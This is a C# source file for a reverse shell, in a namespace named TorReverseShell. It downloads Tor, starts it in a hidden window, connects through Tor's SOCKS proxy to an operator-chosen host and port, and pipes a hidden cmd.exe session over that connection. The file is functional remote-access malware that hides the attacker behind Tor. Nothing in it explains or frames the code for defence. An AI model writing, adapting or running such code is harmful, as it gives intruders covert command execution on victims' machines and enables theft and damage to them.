using System;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

using Starksoft.Aspen.Proxy;
using Ionic.Zip;

namespace TorReverseShell
{
    public class ReverseShell
    {
        string torrc = "SOCKSPort {0}";

        Process torProcess;
        Process cmdProcess;

        NetworkStream networkStream;

        public void KillShit()
        {
            try
            {
                networkStream.Close();
            }
            catch { }
            try
            {
                torProcess.Kill();
            }
            catch { }
            try
            {
                cmdProcess.Kill();
            }
            catch { }
        }

        public void Start(string host, int port, int torPort)
        {
            try
            {
                InternalStart(host, port, torPort).Wait();
            } catch { }
        }
        async Task InternalStart(string host, int port, int torPort)
        {
            if (!File.Exists("./Tor/tor.exe"))
                await DownloadTor();

            if (!File.Exists("./Tor/torrc"))
                File.WriteAllText("./Tor/torrc", string.Format(torrc, torPort) );

            torProcess = await StartTor();

            Socks5ProxyClient proxyClient = new Socks5ProxyClient("127.0.0.1", torPort, "", "");

            TcpClient client = proxyClient.CreateConnection(host, port);
            networkStream = client.GetStream();
            cmdProcess = await StartCmd();
            cmdProcess.StandardInput.AutoFlush = true;

            Task.WaitAny(ReadNetwork(), ReadCmd(), cmdProcess.WaitForExitAsync());

            var payload = Encoding.UTF8.GetBytes("Hello");
        }

        async Task ReadNetwork()
        {
            byte[] buffer = new byte[256];
            int amount;

            while (true)
            {
                amount = await networkStream.ReadAsync(buffer, 0, buffer.Length);

                if (amount != 0)//Along with the cmd one, this might be useless
                {
                    byte[] data = new byte[amount];
                    Array.Copy(buffer, 0, data, 0, amount);
                    await cmdProcess.StandardInput.WriteAsync(Encoding.UTF8.GetString(data));
                }
            }
        }

        async Task ReadCmd()
        {
            char[] buffer = new char[256];
            int amount;

            while (true)
            {
                amount = await cmdProcess.StandardOutput.ReadAsync(buffer, 0, buffer.Length);
                if (amount != 0)
                {
                    char[] data = new char[amount];
                    Array.Copy(buffer, 0, data, 0, amount);

                    byte[] byteData = Encoding.UTF8.GetBytes(data);

                    await networkStream.WriteAsync(byteData, 0, byteData.Length);
                    await networkStream.FlushAsync();
                }
            }
        }

        async Task<Process> StartTor()
        {
            ProcessStartInfo startInfo = new()
            {
                Arguments = $" -f torrc",
                FileName = $"{Directory.GetCurrentDirectory()}/Tor/tor.exe",
                CreateNoWindow = true,
                WorkingDirectory = $"{Directory.GetCurrentDirectory()}/Tor",
            };

            return Process.Start(startInfo);
        }

        async Task<Process> StartCmd()
        {
            ProcessStartInfo startInfo = new()
            {
                FileName = $"cmd",
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardInput = true
            };

            return Process.Start(startInfo);
        }

        async Task DownloadTor()
        {
            HttpClient httpClient = new HttpClient();

            MemoryStream memoryZip = new MemoryStream(
                                        await httpClient.GetByteArrayAsync(
                                            "https://www.torproject.org/dist/torbrowser/11.0.14/tor-win32-0.4.7.7.zip"
                                            )
                                        );

            using (ZipFile zip = ZipFile.Read(memoryZip))
            {
                zip.ExtractAll(".");
            }
        }
    }
}
